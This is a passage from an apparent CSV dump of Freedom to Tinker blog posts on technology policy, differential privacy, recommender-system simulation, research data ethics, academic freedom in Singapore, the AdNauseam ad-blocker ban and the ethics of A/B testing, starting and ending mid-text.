and the law: To really dive into arguments around this point, it helps to know a bit about both technology and the law. I was able to comment on the “patchwork” assertion from a technical perspective, as I discussed above. At the end of the hearing, there was a committee vote on all three bills. It was interesting to see both the voting process, and the commentary that each committee member made with their votes. In the end, there were two abstentions, with the rest in favor. The members who abstained did so largely on the legal question concerning state pre-emption—perhaps foreshadowing the next round of legal battles. Lessons Learned Through this experience, I once again saw the value in having technologists at the table in these forums, where the laws that govern the future of the Internet are being written and decided on. I learned a couple of important lessons, which I’ve briefly summarized below. My job was to bring technical clarity, not to advocate policy. As a witness, technically I am picking a side. And, in these settings, even when making technical points, one is typically doing so to serve one side of a policy or legal argument. Naturally, given my arguments, I registered for a witness in favor of the legislation. However, and importantly: that doesn’t mean my job was to advocate policy. As a technologist, my role as a witness is to explain to the lawmakers technical concepts that can help them make better sense of the various arguments from others in the room. Additionally, I steered clear of rendering legal opinions, and where my comments did rely on legal frameworks, I made it clear that I was not an expert in those matters, but was speaking on technical points within the context of the laws, as I understood them. Finally, when figuring out how to frame my testimony, I consulted many people: the lawmakers, my colleagues at Princeton, and even the ISPs themselves. In all cases, I asked these stakeholders about the topics I might focus on, as opposed to asking what, specifically I should say. I thought hard about what a computer scientist could bring to the discussion, as well as ensuring that what I said was technically accurate and correct. A simple technical explanation is of utmost importance. In such a committee hearing, advocates and lobbyists abound (on both sides); technologists are rare. I suspect I was the only technologist in the room. Additionally, most of the people in the room have jobs to make arguments that serve a particular stakeholder. In doing so, they may muddy the waters, either accidentally or intentionally. To advance their arguments, some people may even say things that are blatantly false (thankfully that didn’t happen on Monday, but I’ve seen it happen in similar forums). Perhaps surprisingly, such discourse can fly by completely unnoticed, because the people in the room—especially the decision-makers—don’t have as deep of an understanding of the technology as the technologists. Technologists need to be in the room, to shed light and to call foul—and, importantly, to do so using accessible language and examples that non-technical policy-makers can understand."
"300","2016-08-26","2023-03-24","https://freedom-to-tinker.com/2016/08/26/differential-privacy-is-vulnerable-to-correlated-data-introducing-dependent-differential-privacy/","[This post is joint work with Princeton graduate student Changchang Liu and IBM researcher Supriyo Chakraborty. See our paper for full details. — Prateek Mittal ] The tussle between data utility and data privacy Information sharing is important for realizing the vision of a data-driven customization of our environment. Data that were earlier locked up in private repositories are now being increasingly shared for enabling new context-aware applications, better monitoring of population statistics, and facilitating academic research in diverse fields. However, sharing personal data gives rise to serious privacy concerns as the data can contain sensitive information that a user might want to keep private. Thus, while on one hand, it is imperative to release utility-providing information, on the other hand, the privacy of users whose data is being shared also needs to be protected. What is differential privacy? Among existing data privacy metrics, differential privacy (DP) has emerged has a rigorous mathematical framework for defining and preserving privacy, and has received considerable attention from the privacy community. DP is used for protecting the privacy of individual users’ data while publishing aggregate query responses over statistical databases, and guarantees that the distribution of query responses changes only slightly with the addition or deletion of a single tuple (entry or record) in the database. Thus, after observing the query response, an adversary is limited in its ability to infer sensitive data about any tuple and in turn about the user contributing the tuple. For example, if the government aims to publish the average salary of individuals in New Jersey, DP can reveal the approximate average salary of this region while protecting the privacy of any individual user’s salary. DP achieves this balance between utility and privacy by adding noise (perturbation) to the true query result, for example, via the Laplace perturbation mechanism. Differential privacy is vulnerable to data correlation! To provide its guarantees, DP implicitly assumes that the data tuples in the database, each from a different user, are all independent. This is a weak assumption, especially because tuple dependence occurs naturally in datasets due to social interactions between users. For example, consider a social network graph with nodes representing users, and edges representing friendship relationships. An adversary can infer the existence of a social link between two users that are not explicitly connected in the graph using the existence of edges among other users in the graph ( since two friends are likely to have many other friends in common). Similarly, private attributes in a user’s record can be inferred by exploiting the public attributes of other users sharing similar interests. An adversary can easily infer a user’s susceptibility to a contagious disease using access to the noisy query result and also the fact that the user’s immediate family members are part of the database. In an era of big-data, the tuples within a database present rich semantics and complex structures that inevitably lead to data correlation. Therefore, data correlation, i.e., the probabilistic dependence relationship among tuples in the database, which is implicitly ignored in DP, can seriously deteriorate the privacy properties of DP. Previous work has investigated this problem and proposed several interesting privacy metrics, such as zero-knowledge privacy, pufferfish privacy, membership privacy, inferential privacy, etc. However, the privacy community is lacking effective perturbation mechanisms that can achieve these proposed privacy metrics. In a paper that we presented at the Network and Distributed System Security Symposium (NDSS 2016), we first demonstrate a Bayesian attack on differentially private mechanisms using real-world datasets (such as Gowalla location data). Our attack exploits the correlation between location information and social information of users in the Gowalla dataset. We show that it is possible to infer a user’s sensitive location information from differentially private responses by exploiting her social relationships. When data is correlated, DP underestimates the amount of noise that must be added to achieve a desired bound on the adversary’s ability to make sensitive inferences. Therefore, correlation (or dependency) among data tuples would break the expected privacy guarantees. How can we improve differential privacy to protect correlated data? Introducing dependent differential privacy. Overall, our work generalizes the classic differential privacy framework to explicitly consider correlations in datasets, thus enhancing the applicability of the approach to a wide range of datasets and applications. We formalize the notion of dependent differential privacy (DDP); DDP aims to explicitly incorporate probabilistic dependency constraints among tuples in the privacy formulation. We also propose a perturbation mechanism to achieve the privacy guarantees in DDP; our approach extends the conventional Laplace perturbation mechanism by incorporating the correlation between data tuples. To do so, we introduce the concept of dependent coefficient between two tuples, which aims to capture the correlation between data tuples from the perspective of privacy. (The dependent coefficient between two tuples evaluates the ratio between the dependent indistinguishability of one tuple induced by the other tuple and the self indistinguishability of the tuple itself.) Our perturbation mechanism can be applied for arbitrary data queries and we validated its effectiveness using real-world datasets. What are future research directions for dependent differential privacy? First, to form a deeper understanding of our dependent differential privacy framework, it would be interesting to explore the application of standard concepts in differential privacy to our framework, such as local sensitivity and smooth sensitivity. Second, the effectiveness of our proposed perturbation mechanism depends on how well the dependence among data can be modeled and computed. One limitation of our work is that the dependence coefficient is exactly known to both the adversary and the database owner. How to accurately compute the dependence coefficient and deal with potential underestimation would be an interesting future work (note that the overestimation of dependence coefficient continues to provide rigorous DDP guarantees). Finally, in our dependent differential privacy framework, we only considered pairwise correlations between tuples in a database. An important research direction is to generalize the pairwise correlations that we considered in our paper to joint correlations in the dataset."
"301","2013-08-10","2023-03-24","https://freedom-to-tinker.com/2013/08/10/educating-leaders-who-tackle-the-challenges-of-their-time-lessons-from-the-past-book-review-first-class-the-legacy-of-dunbar-americas-first-black-public-high-school/","One of last year’s CITP lectures that is still fresh in my mind is Brad Smith’s talk on “Immigration, Education, and the Future of Computer Science in America.” In his presentation on developing a process for educating the next generation of computer scientists in U.S. high schools and colleges, Mr. Smith noted that in the state of New Jersey, where 8.8 million people live, only 874 students took the computer science AP exam, and of those, only 17 were African-American. In Alison Stewart’s excellent new book “First Class: The Legacy of Dunbar, America’s First Black Public High School,” Ms. Smith tells the story of one of the best and most important American high schools of the 20th century. In the first half of the 20th century, Dunbar High School, a public school located in Washington, DC, produced numerous leaders in medicine, science, education, law, politics and the military, including several from my family. With the end of segregation, the conditions that resulted in Dunbar’s creation ceased to exist. The question remains, however, as to how in diverse public education systems to develop leaders in the fields that are critical to the country’s economic and social progress. In Ms. Stewart’s book, she discusses the tight-knit African-American community in Washington, DC and high school teachers with master’s degrees and PhDs highly as keys to student success. In Mr. Smith’s presentation, he discusses, among other things, the importance of training teachers to teach computer science and highlights the contributions of Microsoft employees using technology to teach computer science remotely in rural communities and other areas without enough instructors. Across different contexts, both discuss the role of public-private partnerships in engaging and providing opportunities for students. If you felt Mr. Smith’s presentation was important, I hope you will read Ms. Stewart’s book. My review of her book was published recently on Popville, a popular local blog in Washington, DC. The text of my review is below: Alison Stewart’s excellent new book First Class: The Legacy of Dunbar, America’s First Black Public High School, tells the story of a groundbreaking educational institution born in Washington, DC as a result of a unique set of circumstances and later hobbled by home rule politics, social class conflicts, and racial desegregation without integration. Ms. Stewart, an award-winning journalist who has worked as an anchor and reporter for several major commercial TV networks, as well as NPR and PBS, and whose parents graduated from Dunbar in the 1940s, uses Dunbar as a lens for examining the history of education in Washington, DC. The book covers three distinct eras: First, from 1807-1954, a detailed history of African-American education in Washington, DC and how Dunbar became America’s first African-American public high school; second, beginning with the 1954 Brown v. Board of Education and Bolling v. Sharpe decisions, a transitional period in the years surrounding school integration; and third, Dunbar’s post-1960 full transformation to the neighborhood school it is today, struggling with the challenges of urban education. As someone whose family history in Washington, DC dates to the post-civil war 1800s, I learned new facts about DC’s history and was struck by the irony of Dunbar alums arguing for desegregation at the Supreme Court and then seeing their prestigious and beloved alma mater fray as the unconstitutional system of segregation was dismantled. I was moved by the heartbreaking stories of students and educators trying to honor Dunbar’s past and simultaneously create a present and future that will allow the school to once again become a launching pad for great careers. Dunbar came to be because unlike in much of the South, there were no laws restricting the education of free blacks in Washington, DC. Small schools such as the Bell School and the Normal School for Colored Girls begat the Preparatory High School for Colored Youth, M Street High School, and ultimately in 1916 Dunbar High School. As the only academic high school for African-Americans in Washington, DC, Dunbar effectively became a magnet school. Students from DC had to pass an 8th grade exit exam to enroll and students transferring in to Dunbar as part of the Great Migration had to take an entrance exam. Dunbar’s curriculum focused on English, math, the sciences, ancient history, music, Latin, French and German. Many of its teachers and administrators had graduate and master’s degrees and included doctors, lawyers, and 2 of the first 3 African-American women to receive PhDs. Dunbar sent students to, among others, Harvard, Yale, Brown, Amherst, Williams, Dartmouth, Wellesley and the University of Michigan. Notable alums include Edward Brooke, the first black US Senator elected by popular vote, Charles Drew, the creator of the blood bank, William Hastie, the first African-American Federal judge, and Wesley Brown, the first African-American graduate of the Naval Academy. In 1954, Charles Hamilton Houston and two of his fellow alums from the M Street School, Dunbar’s forerunner, were key members of the team that successfully argued for outlawing legally segregated schools in the states in Brown v. Board of Education and in the District of Columbia in Bolling v. Sharpe. From 1955 onward, Dunbar became a neighborhood school, with attendance solely based on the boundaries within which a child resided. One educator commented at the time that First & O NW was infamous as a gathering place for young men who were unemployed, out of school and “indecent in their public conduct.” Ms. Stewart writes: “It is bitterly ironic that three of the key players in dismantling legal segregation…learned their lessons at a school that became an unintended casualty of necessary civil rights action.” In a July NPR interview, Ms. Stewart described Dunbar benefitting from the glass ceiling segregation placed on Dunbar’s highly educated teachers as a “perversity.” By the mid-1960s, Dunbar and several of its alumni and former teachers, who had moved on to other leadership positions in education in the city, found students not nearly as interested in the tradition-bound lessons that began in 1807. They found themselves having to answer tough questions from students: Why doesn’t Eastern High School have an Afrocentric curriculum? Why is Howard Law School no longer serving the needs of African-Americans seeking equality? Marion Barry came to prominence. Dunbar never did integrate. From the 1970s forward, “the economic and social woes of DC were Dunbar’s woes.” Over the years, there have been periodic signs of hope; a pre-engineering magnet program focused heavily on the sciences and partially financed by corporate sponsors, a Dunbar graduate becoming a Stanford graduate, and most recently, the track coach who will pick up girls at home as early as 3:30am to get them to practice and who can point to every girl in a team photo and name where she is in college. Ms. Stewart ends on a positive note suggesting that given the demographic changes in the neighborhood – as we say in Popville, a mix of newcomers and long-term residents – maybe Dunbar will make history again, as its founders would have wished, “as the first truly, organically integrated school in Washington, DC.”"
"302","2021-08-04","2023-03-24","https://freedom-to-tinker.com/2021/08/04/studying-the-societal-impact-of-recommender-systems-using-simulation/","By Eli Lucherini, Matthew Sun, Amy Winecoff, and Arvind Narayanan. For those interested in the impact of recommender systems on society, we are happy to share several new pieces: a software tool for studying this interface via simulation the accompanying paper a short piece on methodological concerns in simulation research a talk offering a critical take on research on filter bubbles. We elaborate below. Simulation is a valuable way to study the societal impact of recommender systems. Recommender systems in social media platforms such as Facebook and Twitter have been criticized due to the risks they might pose to society, such as amplifying misinformation or creating filter bubbles. But there isn’t yet consensus on the scope of these concerns, the underlying factors, or ways to remedy them. Because these phenomena arise through repeated system interactions over time, methods that assess the system at a single time point provide minimal insight into the mechanisms behind them. In contrast, simulations can model how users, items, and algorithms interact over arbitrarily long timescales. As a result, simulation has proved to be a valuable tool in assessing the impact of recommendation systems on the content users consume and on society. This is a burgeoning area of research. We identified over a dozen studies that use simulation to study questions such as filter bubbles and misinformation. As an example of a study we admire, Chaney et al. illustrate the detrimental effects of algorithmic confounding, which occurs when a recommendation algorithm is trained on user interaction data that is itself influenced by the prior recommendations of the algorithm. Like all simulation research, this is a statement about a model and not a real platform. But the benefit is that it helps isolate the variables of interest so that relationships between them can be probed deeply in a way that improves our scientific understanding of these systems. T-RECS: A new tool for simulating recommender systems So far, most simulation studies of algorithmic systems have relied upon ad-hoc code implemented from scratch, which is time consuming, raises the likelihood of bugs, and limits reproducibility. We present T-RECS (Tools for RECommender system Simulation), an open-source simulation tool designed to enable investigations of emerging complex phenomena caused by millions of individual actions and interactions in algorithmic systems including filter bubbles, political polarization, and (mis)information diffusion. In the accompanying paper, we describe its design in detail and present two case studies. T-RECS is flexible and can simulate just about any system in which “users” interact with “items” mediated by an algorithm. This is broader than just recommender systems: for example, we used T-RECS to reproduce a study on the virality of online content. T-RECS also supports two-sided platforms, i.e., those that include both users and content creators. The system is not limited to social media either: it can also be used to study music recommender systems or e-commerce platforms. With T-RECS, researchers with expertise in social science but limited engineering expertise can still leverage simulation to answer important questions about the societal effects of algorithmic systems. What’s wrong with current recsys simulation research? In a companion paper to T-RECS, we offer a methodological critique of current recommender systems simulation research. First, we observe that each paper tends to operationalize constructs such as polarization in subtly different ways. Despite seemingly minor differences, the effects may be vastly different, making comparisons between papers infeasible. We acknowledge that this is natural in the early stages of a discipline and is not necessarily a crisis by itself. Unfortunately, we also observe low transparency: papers do not specify their constructs in enough detail to allow others to reproduce and build on them, and practices such as sharing code and data are not yet the norm in this community. We advocate for the adoption of software tools such as T-RECS that would help address both issues. Researchers would be able to draw upon a standard library of models and constructs. Further, they would be easily able to share reproduction materials as notebooks, containing code, data, results, and documentation packaged together. Why do we need simulation, again? Given that it is tricky to do simulation correctly and even harder to do it in a way that allows us to draw meaningful conclusions that apply to the real world, one may wonder why we need simulation for understanding the societal impacts of recommender systems at all. Why not stick with auditing or observational studies of real platforms? A notable example of such a study is “Exposure to ideologically diverse news and opinion on Facebook” by Bakshy et al. The study found that while Facebook’s users primarily consume ideologically-aligned content, the role of Facebook’s news feed algorithm is minimal compared to users’ own choices. In a recent talk, one of us (Narayanan) discussed the limitations of quantitative studies of real platforms, focusing on the question of filter bubbles. The argument is this: the question of interest is causal in nature, but we can’t answer causal questions because the entire system evolves as one unit over a long period of time. Faced with this inherent limitation, studies such as the Facebook study above inevitably study very narrow versions of the question, focusing on a snapshot in time and ignoring feedback loops and other complications. Thus, while there is nothing wrong with these studies, they tell us little about the questions we really care about, and yet are widely misinterpreted to mean more than they do. In conclusion, every available method for studying the societal impact of recommender systems has severe limitations. Yet this is an urgent question with enormous consequences; the study of these questions has been called a crisis discipline. We need every tool in the toolbox, even if none is perfect for the job. We need auditing and observational studies; we need qualitative studies; and we need simulation. Through T-RECS and its accompanying papers, we hope to both systematize research in this area and provide foundational infrastructure."
"303","2018-09-14","2023-03-24","https://freedom-to-tinker.com/2018/09/14/privacy-ethics-and-data-access-a-case-study-of-the-fragile-families-challenge/","This blog post summarizes a paper describing the privacy and ethics process by which we organized the Fragile Families Challenge. The paper will appear in a special issue of the journal Socius. Academic researchers, companies, and governments holding data face a fundamental tension between risk to respondents and benefits to science. On one hand, these data custodians might like to share data with a wide and diverse set of researchers in order to maximize possible benefits to science. On the other hand, the data custodians might like to keep data locked away in order to protect the privacy of those whose information is in the data. Our paper is about the process we used to handle this fundamental tension in one particular setting: the Fragile Families Challenge, a scientific mass collaboration designed to yield insights that could improve the lives of disadvantaged children in the United States. We wrote this paper not because we believe we eliminated privacy risk, but because others might benefit from our process and improve upon it. One scientific objective of the Fragile Families Challenge was to maximize predictive performance of adolescent outcomes (i.e. high school GPA) measured at approximately age 15 given a set of background variables measured from birth through age 9. We aimed to do so using the Common Task Framework (see Donoho 2017, Section 6): we would share data with researchers who would build predictive models using observed outcomes for half of the cases (the training set). These researchers would receive instant feedback on out-of-sample performance in ⅛ of the cases (the leaderboard set) and ultimately be evaluated by performance in ⅜ of the cases which we would keep hidden until the end of the Challenge (the holdout set). If scientific benefit was the only goal, the optimal design might be to include every possible variable in the background set and share with anyone who wanted access with no restrictions. Scientific benefit may be maximized by sharing data widely, but risk to respondents is also maximized by doing so. Although methods of data sharing with provable privacy guarantees are an active area of research, we believed that solutions that could offer provable guarantees were not possible in our setting without a substantial loss of scientific benefit (see Section 2.4 of our paper). Instead, we engaged in a privacy and ethics process that involved threat modeling, threat mitigation, and third-party guidance, all undertaken within an ethical framework. Threat modeling Our primary concern was a risk of re-identification. Although our data did not contain obvious identifiers, we worried that an adversary could find an auxiliary dataset containing identifiers as well as key variables also present in our data. If so, they could link our dataset to the identifiers (either perfectly or probabilistically) to re-identify at least some rows in the data. For instance, Sweeney was able to re-identify Massachusetts medical records data by linking to identified voter records using the shared variables zip code, date of birth, and sex. Given the vast number of auxiliary datasets (red) that exist now or may exist in the future, it is likely that some research datasets (blue) could be re-identified. It is difficult to know in advance which key variables (purple) may aid the adversary in this task. To make our worries concrete, we engaged in threat modeling: we reasoned about who might have both (a) the capability to conduct such an attack and (b) the incentive to do so. We even tried to attack our own data. Through this process we identified five main threats (the rows in the figure below). A privacy researcher, for instance, would likely have the skills to re-identify the data if they could find auxiliary data to do so, and might also have an incentive to re-identify, perhaps to publish a paper arguing that we had been too cavalier about privacy concerns. A nosy neighbor who knew someone in the data might be able to find that individual’s case in order to learn information about their friend which they did not already know. We also worried about other threats that are detailed in the full paper. Threat mitigation To mitigate threats, we took several steps to (a) reduce the likelihood of re-identification and to (b) reduce the risk of harm in the event of re-identification. While some of these defenses were statistical (i.e. modifications to data designed to support aims [a] and [b]), many instead focused on social norms and other aspects of the project that are more difficult to quantify. For instance, we structured the Challenge with no monetary prize, to reduce an incentive to re-identify the data in order to produce remarkably good predictions. We used careful language and avoided making extreme claims to have “anonymized” the data, thereby reducing the incentive for a privacy researcher to correct us. We used an application process to only share the data with those likely to contribute to the scientific goals of the project, and we included an ethical appeal in which potential participants learned about the importance of respecting the privacy of respondents and agreed to use the data ethically. None of these mitigations eliminated the risk, but they all helped to shift the balance of risks and benefits of data sharing in a way consistent with ethical use of the data. The figure below lists our main mitigations (columns), with check marks to indicate the threats (rows) against which they might be effective. The circled check mark indicates the mitigation that we thought would be most effective against that particular adversary. Third-party guidance A small group of researchers highly committed to a project can easily convince themselves that they are behaving ethically, even if an outsider would recognize flaws in their logic. To avoid groupthink, we conducted the Challenge under the guidance of third parties. The entire process was conducted under the oversight and approval of the Institutional Review Board of Princeton University, a requirement for social science research involving human subjects. To go beyond what was required, we additionally formed a Board of Advisers to review our plan and offer advice. This Board included experts from a wide range of fields. Beyond the Board, we solicited informal outside advice from a diverse set of anyone we could talk to who might have thoughts about the process, and this proved valuable. For example, at the advice of someone with experience planning high-risk operations in the military, we developed a response plan in case something went wrong. Having this plan in place meant that we could respond quickly and forcefully should something unexpected have occurred. Ethics After the process outlined above, we still faced an ethical question: should we share the data and proceed with the Fragile Families Challenge? This was a deep and complex question to which a fully satisfactory answer was likely to be elusive. Much of our final decision drew on the principles of the Belmont Report, a standard set of principles used in social science research ethics. While not perfect, the Belmont Report serves as a reasonable benchmark because it is the standard that has developed in the scientific community regarding human subjects research. The first principle in the Belmont Report is respect for persons. Because families in the Fragile Families Study had consented for their data to be used for research, sharing the data with researchers in a scientific project agreed with this principle. The second principle is beneficence, which requires that the risks of research be balanced against potential benefits. The threat mitigations we carried out were designed with beneficence in mind. The third principle is justice: that the benefits of research should flow to a similar population that bears the risks. Our sample included many disadvantaged urban American families, and the scientific benefits of the research might ultimately inform better policies to help those in similar situations. It would be wrong to exclude this population from the potential to benefit from research, so we reasoned that the project was in line with the principle of justice. For all of these reasons, we decided with our Board of Advisers that proceeding with the project would be ethical. Conclusion To unlock the power of data while also respecting respondent privacy, those providing access to data must navigate the fundamental tension between scientific benefits and risk to respondents. Our process did not offer provable privacy guarantees, and it was not perfect. Nevertheless, our process to address this tension may be useful to others in similar situations as data stewards. We believe the core principles of threat modeling, threat mitigation, and third-party guidance within an ethical framework will be essential to such a task, and we look forward to learning from others in the future who build on what we have done to improve the process of navigating this tension. You can read more about our process in our pre-print: Lundberg, Narayanan, Levy, and Salganik (2018) “Privacy, ethics, and data access: A case study of the Fragile Families Challenge.”"
"304","2013-03-07","2023-03-24","https://freedom-to-tinker.com/2013/03/07/singapore-punishes-net-freedom-advocate/","Over the last few days my activist self has come out. I was a tenure reviewer for Dr. Cherian George at Nanyang Technical University, one of Singapore’s most high-profile universities. His tenure case was overturned at the top, where university administration meets the country’s political elites. It is difficult to dismiss George on the basis of academic merit. With degrees from Cambridge, Columbia, and Stanford, his pedigree is admirable. He has three books under his belt: the eviscerating “Air Conditioned Nation”, the evocative “Freedom From the Press” and a scholarly tome comparing independent online journalism in Singapore and Malaysia that was actually published at home by Singapore University Press. Through a string of academic articles, George has been equally critical of the government and the press, so it is not surprising that the country’s journalists have not rushed to his defense. He has revealed to colleagues that the decision to deny his tenure was solely because of “non-academic factors”—the university administrators told him as much. He’s had positive teaching evaluations. This wasn’t a merit based decision. The protections of tenure are important in every country. In the United States, for example, it was behind the shield of tenure that prominent media scholar Siva Vaidhyanathan was able to call out the misguided maneuverings of the University of Virginia’s trustees. Indeed, through tenacity and eloquence he demonstrated to the entire country that having public universities overseen by a board of regional business leaders could make for bad management decisions. As one of Singapore’s most high profile censorship critics, Cherian George is guilty of several things. In his teaching, he is guilty of corrupting several cohorts of young journalism students with ideas about press freedoms. In his role as a public intellectual, he is guilty of helping to organize and inform the country’s growing community of independent bloggers and citizen journalists. This is actually the second time there has been high level interference with his career trajectory. In 2008, he helped lead a coalition of democracy advocates to lobby for more internet freedoms in Singapore, and helped lead a workshop to teach bloggers about their (lack of) rights. The regime ordered NTU to have nothing to do with the efforts, though that did not stop George from moving ahead on his own energy. The National University of Singapore’s Law School had originally offered to host the blogger workshop, but they too were instructed to stay clear. But George helped pull the event off anyway. The next year, his case for promotion moved smoothly up the ranks within the University, but was quashed with little explanation by the University’s President. For more on this evolving story, here’s a commentary piece I did for TechPresident. A statement from the Berkman Center on Tumblr. The Twitter hashtag: #georgefortenure The Online Petition For Tenure. Article in Singapore Straights Times Regional WSJ blog post"
"305","2017-01-24","2023-03-24","https://freedom-to-tinker.com/2017/01/24/adnauseam-google-and-the-myth-of-the-acceptable-ad/","Earlier this month, we (Helen Nissenbaum, Mushon Zer-Aviv, and I), released a new and improved AdNauseam 3.0. For those not familiar, AdNauseam is the adblocker that clicks every ad in an effort to obfuscate tracking profiles and inject doubt into the lucrative economic system that drives advertising-based surveillance. The 3.0 release contains some new features we’ve been excited to discuss with users and critics, but the discussion was quickly derailed when we learned that Google had banned AdNauseam from its store, where it had been available for the past year. We also learned that Google has disallowed users from manually installing or updating AdNauseam on Chrome, effectively locking them out of their own saved data, all without prior notice or warning. Whether or not you are a fan of AdNauseam’s strategy, it is disconcerting to know that Google can quietly make one’s extensions and data disappear at any moment, without so much as a warning. Today it is a privacy tool that is disabled, but tomorrow it could be your photo album, chat app, or password manager. You don’t just lose the app, you lose your stored data as well: photos, chat transcripts, passwords, etc. For developers, who, incidentally, must pay a fee to post items in the Chrome store, this should cause one to think twice. Not only can your software be banned and removed without warning, with thousands of users left in the lurch, but all comments, ratings, reviews, and statistics are deleted as well. When we wrote Google to ask the reason for the removal, they responded that AdNauseam had breached the Web Store’s Terms of Service, stating that “An extension should have a single purpose that is clear to users”[1]. However, the sole purpose of AdNauseam seems readily apparent to us—namely to resist the non-consensual surveillance conducted by advertising networks, of which Google is a prime example. Now we can certainly understand why Google would prefer users not to install AdNauseam, as it opposes their core business model, but the Web Store’s Terms of Service do not (at least thus far) require extensions to endorse Google’s business model. Moreover, this is not the justification cited for the software’s removal. So we are left to speculate as to the underlying cause for the takedown. Our guess is that Google’s real objection is to our newly added support for the EFF’s Do Not Track mechanism[2]. For anyone unfamiliar, this is not the ill-fated DNT of yore, but a new, machine-verifiable (and potentially legally-binding) assertion on the part of websites that commit to not violating the privacy of users who choose to send the DNT header. A new generation of blockers including the EFF’s Privacy Badger, and now AdNauseam, have support for this mechanism built-in, which means that they don’t (by default) block ads and other resources from DNT sites, and, in the case of AdNauseam, don’t simulate clicks on these ads. So why is this so threatening to Google? Perhaps because it could represent a real means for users, advertisers, and content-providers to move away from surveillance-based advertising. If enough sites commit to Do Not Track, there will be significant financial incentive for advertisers to place ads on those sites, and these too will be bound by DNT, as the mechanism also applies to a site’s third-party partners. And this could possibly set off a chain reaction of adoption that would leave Google, which has committed to surveillance as its core business model, out in the cold. But wait, you may be thinking, why did the EFF develop this new DNT mechanism when there is AdBlock Plus’ “Acceptable Ads” programs, which Google and other major ad networks already participate in? That’s because there are crucial differences between the two. For one, “Acceptable Ads” is pay-to-play; large ad networks pay Eyeo, the company behind Adblock Plus, to whitelist their sites. But the more important reason is that the program is all about aesthetics—so-called “annoying” or “intrusive” ads—which the ad industry would like us to believe is the only problem with the current system. An entity like Google is fine with “Acceptable Ads” because they have more than enough resources to pay for whitelisting[3] . Further, they are quite willing to make their ads more aesthetically acceptable to users (after all, an annoyed user is unlikely to click)[4]. What they refuse to change (though we hope we’re wrong about this) is their commitment to surreptitious tracking on a scale never before seen. And this, of course, is what we, the EFF, and a growing number of users find truly “unacceptable” about the current advertising landscape. [1] In the one subsequent email we received, a Google representative stated that a single extension should not perform both blocking and hiding. This is difficult to accept at face value as nearly all ad blockers (including uBlock, Adblock Plus, Adblock, Adguard, etc., all of which are allowed in the store) also perform blocking and hiding of ads, trackers, and malware. Update (Feb 17, 2017): it has been a month since we have received any message from Google despite repeated requests for clarification, and despite the fact that they claim, in a recent Consumerist article, to be “in touch with the developer to help them resubmit their extension to get included back in the store.” [2] This is indeed speculation. However, as mention in [1], the stated reason for Google’s ban of AdNauseam does not hold up to scrutiny. [3] In September of this year, Eyeo announced that it would partner with a UK-based ad tech startup called ComboTag to launch the“Acceptable Ads Platform” with which they would act also as an ad exchange, selling placements for “Acceptable Ad” slots. Google, as might be expected, reacted negatively, stating that it would no longer do business with ComboTag. Some assumed that this might also signal an end to their participation in“Acceptable Ads” as well. However, this does not appear to be the case. Google still comprises a significant portion of the exception list on which “Acceptable Ads” is based and, as one ad industry observer put it, “Google is likely Adblock Plus’ largest, most lucrative customer.” [4] Google is also a member of the “Coalition for Better Ads”, an industry-wide effort which, like “Acceptable Ads”, focuses exclusively on issues of aesthetics and user experience, as opposed to surveillance and data profiling."
"306","2014-07-08","2023-03-24","https://freedom-to-tinker.com/2014/07/08/on-the-ethics-of-ab-testing/","The discussion triggered by Facebook’s mood manipulation experiment has been enlightening and frustrating at the same time. An enlightening aspect is how it has exposed divergent views on a practice called A/B testing, in which a company provides two versions of its service to randomly-chosen groups of users, and then measures how the users react. A frustrating aspect has been the often-confusing arguments made about the ethics of A/B testing. One thing that is clear is that the ethics of A/B testing are an important and interesting topic. This post is my first cut at thinking through these ethical questions. I am thinking about A/B testing in general, and not just testing done for academic research purposes. Some disclaimers: I am considering A/B testing in general rather than one specific experiment; I am considering what is ethical rather than what is legal or what is required by somebody’s IRB; I am considering how people should act rather than observing how they do act. Let’s start with an obvious point: Some uses of A/B testing are clearly ethical. For example, if a company wants to know which shade of blue to use in their user interface, they might use A/B testing to try a few shades and measure user’s responses. This is ethical because no user is harmed, especially if the only result is that the service better serves users. Here’s another point that should be obvious: Some uses of A/B testing are clearly unethical. Consider a study where a service falsely tells teens that their parents are dead, or a study that tries to see if a service can incite ethnic violence in a war-torn region. Both studies are unethical because they cause significant harm or risk of harm. So the question is not whether A/B testing is ethical, but rather where we should draw the line between ethical and unethical uses. A consequence of this is that any argument that implies that A/B testing is always ethical or always unethical must be wrong. Here’s an example argument: Company X does A/B testing all the time; this is just another type of A/B testing; therefore this is ethical. Here’s another: Company X already uses an algorithm to decide what to show to users, and that algorithm changes from time to time; this is just another change to the algorithm; therefore this is ethical. Both arguments are invalid, in the same way that it’s invalid to argue that Chef Bob often cuts things with a knife, therefore it is ethical for him to cut up anything he wants. The ethical status of the act depends on what exactly Chef Bob is cutting, what exact A/B test is being done, or what exact algorithm is being used. (At the risk of stating the obvious: the fact that these sorts of invalid arguments are made on behalf of a practice does not in itself imply that the practice is bad.) Another argument goes like this: Everybody knows that companies do A/B tests of type X; therefore it is ethical for them to do A/B tests of type X. This is also an invalid argument, because knowledge that an act is occurring does not imply that the act is ethical. But the “everyone knows” argument is not entirely irrelevant, because we can refine it into a more explicit argument that deserves closer consideration. This is the implied consent argument: User Bob knows that if he uses Service X he will be subject to A/B tests of Type Y; Bob chooses to use Service X; therefore Bob can be deemed to have consented to Service X performing A/B tests of Type Y on him. Making the argument explicit in this way exposes two potential failures in the argument. First, there must be general knowledge among users that a particular type of testing will happen. “Everyone knows” is not enough, if “everyone” means everyone in the tech blogosphere, or everyone who works in the industry. Whether users understand something to be happening is an empirical question that can be answered with data; or a company can take pains to inform its users—but of course I mean actually informing users, not just providing some minimal the-information-was-available-if-you-looked notification theater. Second, the consent here is implied rather than explicit. In practice, User Bob might not have much real choice about whether to use a service. If his employer requires him to use the service, then he would have to quit his job to avoid being subject to the A/B test, and the most we can infer from his use of the service is that he dislikes the test less than he would dislike losing his job. Similarly, Bob might feel he needs to use a service to keep tabs on his kids, to participate in a social or religious organization, or for some other reason. The law might allow a legal fiction of implied consent, but what we care about ethically is whether Bob’s act of using the service really does imply that he does not object to being a test subject. Both of these caveats will apply differently to different users. Some users will know about a company’s practices but others will not. Some users will have a free, unconstrained choice whether to use a service but others will not. Consent can validly be inferred for some users and not others; and in general the service won’t be able to tell for which users it exists. So if a test is run on a randomly selected set of users, it’s likely that consent can be inferred for only a subset of those users. Where does this leave us? It seems to me that where the risks are minimal, A/B testing without consent is unobjectionable, as in the shades-of-blue example. Where risks are extremely high or there are significant risks to non-participants, as in the ethnic-violence example, the test is unethical even with consent from participants. In between, there is a continuum of risk levels, and the need for consent would vary based on the risk. Higher-risk cases would merit explicit, no-strings-attached consent for a particular test. For lower-risk cases, implied consent would be sufficient, with a 